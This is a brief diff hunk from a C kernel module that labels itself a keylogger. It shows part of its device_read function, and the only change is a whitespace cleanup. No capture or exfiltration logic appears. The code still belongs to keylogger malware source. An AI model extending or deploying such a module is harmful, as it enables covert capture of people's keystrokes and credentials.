@@ -230,7 +230,7 @@ static ssize_t device_read(struct file *filp,char __user * buff, size_t len, lof
 	int bytes = 0;
 	// char c; // unused variable
 	int size = 0;
-	
+
 	printk(KERN_ALERT "[KEYLOGGER] Reading device.\n");
 	// TODO: Rewrite this function
 	if (*buff_Ptr == 0 || deleted || output_once)
